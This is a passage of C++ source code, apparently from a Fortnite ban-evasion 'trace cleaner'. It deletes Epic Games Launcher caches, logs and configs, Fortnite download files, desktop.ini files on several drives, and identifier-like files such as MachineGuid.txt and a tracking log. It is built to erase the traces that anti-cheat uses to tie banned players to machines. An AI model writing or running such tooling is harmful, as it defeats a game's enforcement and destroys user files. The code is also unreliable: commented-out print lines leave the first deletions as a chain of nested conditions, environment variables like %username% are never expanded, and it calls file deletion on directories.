																				//cout << "Deleted F:\\Users\\Gaypple\\Documents\\Unreal Engine\\Engine\\Config\\UserGameUserSettings.ini" << endl;

																				if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
																					//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\Unreal Engine\\Engine\\Config\\UserGameUserSettings.ini" << endl;

																					if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Cloud\bb360279f89647c982d9bc6ab596c2ee\ClientSettings.Sav)").c_str()) != 0)
																						//cout << "Deleted F:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\Cloud\\ClientSettings.Sav" << endl;

																						if (DeleteFileW(L"F:\\Windows\\System32\\restore\\MachineGuid.txt") != 0)
																							//cout << "Deleted F:\\Windows\\System32\\restore\\MachineGuid.txt" << endl;

																							if (DeleteFileW(L"F:\\System Volume Information\\tracking.log") != 0)
																								//cout << "Deleted F:\\System Volume Information\\tracking.log" << endl;

																								if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																									//cout << "Deleted F:\\Users\\Gaypple\\ntuser.ini" << endl;
																									if (DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\ntuser.pol)").c_str()) != 0)
																										//cout << "Deleted F:\\Users\\Gaypple\\ntuser.pol" << endl;

																										if (DeleteFileW(L"F:\\PerfLogs\\collection.dat") != 0)
																											//cout << "Deleted F:\\PerfLogs\\collection.dat" << endl;

																											if (DeleteFileW(L"F:\\Drivers\\storage.cache") != 0)
																												//cout << "Deleted F:\\Drivers\\storage.cache" << endl;

																												if (DeleteFileW(L"F:\\Intel\\setup.cache") != 0)
																													//cout << "Deleted F:\\Intel\\setup.cache" << endl;

																													if (DeleteFileW(L"F:\\MSOCache\\Setup.dat") != 0)
																														//cout << "Deleted F:\\MSOCache\\Setup.dat" << endl;
																														if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Build\\NotForLicensees\\EpicInternal.txt") != 0)


																															if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Build\\PerforceBuild.txt") != 0)


																																if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Build\\SourceDistribution.txt") != 0)
																																	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Videos\Captures\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Videos\Captures\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Videos\Captures\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Videos\Captures\desktop.ini)").c_str());

	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\OneDrive\desktop.ini)").c_str());
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Downloads\desktop.ini)").c_str());
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Videos\desktop.ini)").c_str());
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Pictures\desktop.ini)").c_str());
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Music\desktop.ini)").c_str());
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Documents\desktop.ini)").c_str());
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Desktop\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\OneDrive\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Downloads\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Videos\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Pictures\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Music\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Documents\desktop.ini)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\Desktop\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\OneDrive\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Downloads\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Videos\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Pictures\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Music\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Documents\desktop.ini)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\Desktop\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\OneDrive\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Downloads\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Videos\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Pictures\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Music\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Documents\desktop.ini)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\Desktop\desktop.ini)").c_str());

	/*new traces*/

	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\09_SubgameSelect_Default_StW-512x1024-e47f51e25cbe9943678b9221056a808e81da40e3.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_BattleLabs_PlaylistTile-(2)-1024x512-ca5f4e84a2941264f787239caa5458d0eabd39e3.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_In-Game_Launch_Week1_SubgameSelect-512x1024-8b298ddfb13ca218af3f10017e4e989888212e9e.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_Launch_ModeTiles_Duos-1024x512-b73da22f5ef25695bd78814e0c708253a2cfd66b.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_Launch_ModeTiles_Solo-1024x512-867508f824d65b998c1e11180306eeb720b1aa11.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_Launch_ModeTiles_Squad-1024x512-4bca2b25311bd5b8c6bd4a4aa32b2bfa2fadbf78.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_LTM_Siphon_PlaylistTile-1024x512-712b3caea93ea8df09d1592c88d55913ad296526.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\11BR_LunarNewYear_GanPickaxe_MOTD_1920x1080-1920x1080-7c458359ec91e63c981ae8bae9498a590446c32b.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\BR06_ModeTile_TDM-1024x512-878ba9f92deb153ec85f2bcbce925e185344290e.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\C2CM_Launch_In-Game_Subgame_PropHunt-512x1024-c84b714dc3c2f4ec9dc966074c0c53deef2dc9.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\CM_LobbyTileArt-1024x512-fb48db36552ccb1ab4021b722ea29d515377cc.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\Fortnite%2Ffortnite-game%2Fbattleroyalenews%2F1140+HF%2F8ball_MOTD_1024x512-1024x512-b8690a2ee91e5ccfc2c9ab23561be0dda6ee55.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\Fortnite%2Ffortnite-game%2Ftournaments%2F11BR_Arena_ModeTiles_Duos-1024x512-a431d8587eb87ad5630eada21b60bca9874d116a.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\Files\\9A71EB4A90946A4A0D9B7D82F48C55B49D0880\\Fortnite%2Ffortnite-game%2Ftournaments%2F11BR_Arena_ModeTiles_Solo_ModeTile-1024x512-6cee09d7bcf82ce3f32ca7c77ca04948121ce617.jpg");
	DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\DMS");
	DeleteFileW(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\0BF0DEAA8A19079E0D347735A2F512415B4D9B14");
	DeleteFileW(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\2895B436A3CE70D8FCBBA971A99D7782F30E1715");
	DeleteFileW(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\2A6A06259337531EA5101E9BD8818AE92450FCE4");
	DeleteFileW(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\2AB442E2E24447F99F9C2F298E583AD6F68AEA9B");
	DeleteFileW(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\392F08F2C63619C978F2076694222ABC3054CFC4");
	DeleteFileW(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\961B1FEC1E2362CF4FD638D26E622DE659AC92E9");
	DeleteFileW(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\AEE16FB402698196FE2ABBC267BB5015D24144EB");
	DeleteFileW(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\E14DAB2F57E4763BB4A8F40F08DD57DC07ADE36C");
	DeleteFileW(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\F005B0C18B5D2B42267BDF297A7FC7C62901554B");
	DeleteFileW(L"D:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\F127DEB22E390D0C299F3642BDF2B41D6E2A0B9C");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\0BF0DEAA8A19079E0D347735A2F512415B4D9B14");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\2895B436A3CE70D8FCBBA971A99D7782F30E1715");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\2A6A06259337531EA5101E9BD8818AE92450FCE4");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\2AB442E2E24447F99F9C2F298E583AD6F68AEA9B");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\392F08F2C63619C978F2076694222ABC3054CFC4");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\961B1FEC1E2362CF4FD638D26E622DE659AC92E9");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\AEE16FB402698196FE2ABBC267BB5015D24144EB");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\E14DAB2F57E4763BB4A8F40F08DD57DC07ADE36C");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\F005B0C18B5D2B42267BDF297A7FC7C62901554B");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\CMS\\Files\\C28FF1DE0C661DAF01E118A30B3F21B897A7A6E2\\F127DEB22E390D0C299F3642BDF2B41D6E2A0B9C");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\c7dee411e20a44ab930f841e8d206b1b");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\a22d837b6a2b46349421259c0a5411bf");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\b800b911053c4906a5bd399f46ae0055");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\3460cbe1c57d4a838ace32951a4d7171");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\c52c1f9246eb48ce9dade87be5a66f29");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\7e2a66ce68554814b1bd0aa14351cd71");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\PersistentDownloadDir\\EMS\\b6c60402a72e4081a6a47c641371c19f");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\Staged\\a1acda587b3e4c7b87df4eb11fece3c0.dat");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\a1acda587b3e4c7b87df4eb11fece3c0.dat");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000067");
	DeleteFileW(L"C:\\ProgramData\\Intel\\ShaderCache\\EpicGamesLauncher_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\databases\\Databases.db");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_ssl.kaptcha.com_0.localstorage");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage\\https_www.epicgames.com_0.localstorage");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\databases");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Local Storage");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\4cb013792b196a35_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\f1cdccba37924bda_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\ba23d8ecda68de77_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\67a473248953641b_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\b6c28cea6ed9dfc1_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\013888a1cda32b90_1");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000001");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00004d");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00004e");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00004f");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000050");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000051");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000052");
	DeleteFileW(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000053");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\EditorPerProjectUserSettings.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Engine.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Game.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Hardware.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Input.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Lightmass.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\PortalRegions.ini");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\65f6b08d488442e694b1e23d152d971e.dat");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\b371f0ee15b74eba84bd23830461130c.dat");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\OC_65f6b08d488442e694b1e23d152d971e.dat");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\OC_b371f0ee15b74eba84bd23830461130c.dat");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\cef3.log");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher.log");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher_2.log");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_0");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_1");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_2");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_3");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000001");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000002");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000004");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000005");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000006");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000007");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000008");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000009");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000a");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000b");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000c");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000d");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000e");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000f");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000010");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000011");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000012");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000013");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000014");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000015");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000016");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000017");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000018");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000019");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001a");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001b");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001c");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001d");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001e");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00001f");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000020");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000021");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000022");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000023");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000024");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000025");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000026");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000027");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000028");
	DeleteFileW(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00002b");
